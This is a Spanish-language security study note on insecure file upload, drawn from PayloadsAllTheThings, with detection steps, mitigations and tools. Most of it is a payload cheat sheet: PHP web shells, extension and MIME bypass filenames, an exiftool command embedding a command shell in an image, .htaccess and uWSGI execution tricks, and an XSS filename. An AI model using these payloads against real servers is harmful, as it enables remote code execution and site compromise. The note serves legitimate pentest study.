---
tags:
  - seguridad-web
  - owasp
  - file-upload
aliases:
  - Subida de archivos insegura
  - File Upload
  - Upload Insecure Files
---

# Subida de archivos insegura

**La subida de archivos insegura ocurre cuando una aplicación acepta archivos sin validar correctamente su tipo, extensión o contenido.** Un atacante puede subir una web shell con un nombre o MIME manipulado y lograr ejecución de código arbitrario.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Si el servidor guarda el archivo en una ruta accesible y lo sirve/interpreta según su extensión, subir un script (PHP, ASP, JSP) ejecutable conduce a RCE. Aun cuando el archivo no se ejecute, su extensión o tipo pueden disparar otras vulnerabilidades (XSS con `.svg`/`.html`, XXE con `.xml`, CSV injection con `.csv`, RCE/LFI con `.zip`).

## Detección y pruebas
Localiza cualquier funcionalidad de subida (avatar, documentos, imágenes). Comprueba qué validación aplica: extensión, `Content-Type`, magic bytes, o solo el lado cliente. Intenta subir un script y accede a su URL para ver si se interpreta. Si hay filtros, combina los bypass de abajo.

## Explotación / payloads
**Extensiones ejecutables y alternativas (PHP):**

```
.php .php3 .php4 .php5 .php7 .pht .phtml .phar .inc
.asp .aspx .cer .asa        # ASP/IIS
.jsp .jspx .jsw .jspf       # JSP
```

**Trucos de extensión (bypass de filtros):**

```
shell.jpg.php        # doble extensión
shell.php.jpg        # doble extensión inversa (mala config Apache)
shell.pHp5           # mayúsculas/minúsculas mezcladas
shell.php%00.jpg     # null byte (pathinfo)
shell.php......      # puntos finales (Windows los elimina)
shell.php%20  shell.php%0d%0a.jpg   # espacios / saltos de línea
name.%E2%80%AEphp.jpg   # RTLO -> "name.gpj.php"
file.asax:.jpg       # ADS NTFS en Windows
```

**MIME y magic bytes:** cambiar `Content-Type: application/x-php` por `image/gif` (o duplicar la cabecera) y anteponer la firma de una imagen real:

```
PNG: \x89PNG\r\n\x1a\n        JPG: \xff\xd8\xff        GIF: GIF87a / GIF8;
```

**Web shells sin etiqueta `<?php`:**

```php
<script language="php">system("id");</script>
<?=`id`?>
```

**Imagen con payload + metadatos (combinar con LFI para ejecutar):**

```bash
convert -size 110x110 xc:white payload.jpg
exiftool -Comment="<?php system($_POST['cmd']); __halt_compiler();" payload.jpg
```

**Subir archivos de configuración para forzar ejecución:**

```apache
# .htaccess (Apache): mapea .rce como PHP, luego sube shell.rce
AddType application/x-httpd-php .rce
```

```ini
; uwsgi.ini (uWSGI): el operador @ ejecuta al parsear
[uwsgi]
body = @(exec://whoami)
```

También `web.config` (IIS), `package.json`/`composer.json` (script `prepare`/`pre-command-run`), o un `.pth` de Python en `site-packages` para ejecución al iniciar el intérprete.

**Payloads en el nombre de archivo** (cuando el riesgo está en el tratamiento posterior): SQLi, XSS (`'"><img src=x onerror=alert(1)>.png`), path traversal (`../../../tmp/x.png`), command injection.

CVE relevantes en procesado de imágenes/vídeo: **ImageTragick (CVE-2016-3714)** y **CVE-2022-44268** en ImageMagick; lectura de archivos vía playlist HLS en **FFmpeg**.

## Mitigación
- Validar con **lista de permitidos** de extensiones y verificar el contenido real (no confiar en `Content-Type`).
- Renombrar el archivo con un nombre aleatorio y **quitar la extensión peligrosa**; no usar el nombre del usuario.
- Almacenar fuera del webroot o en un dominio/almacenamiento sin ejecución; deshabilitar la interpretación de scripts en el directorio de subidas.
- Limitar tamaño, re-procesar imágenes (re-encode) y escanear con antivirus. Mantener actualizadas las librerías (ImageMagick, FFmpeg).

## Herramientas
- **Fuxploider** — escáner y explotación de subida de archivos.
- **Burp Upload Scanner** / **OWASP ZAP FileUpload** — pruebas de subida en proxy.

---
🔗 Relacionado: [[Inclusión de archivos (LFI-RFI)]] · [[Path Traversal]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) (MIT, © Swissky)
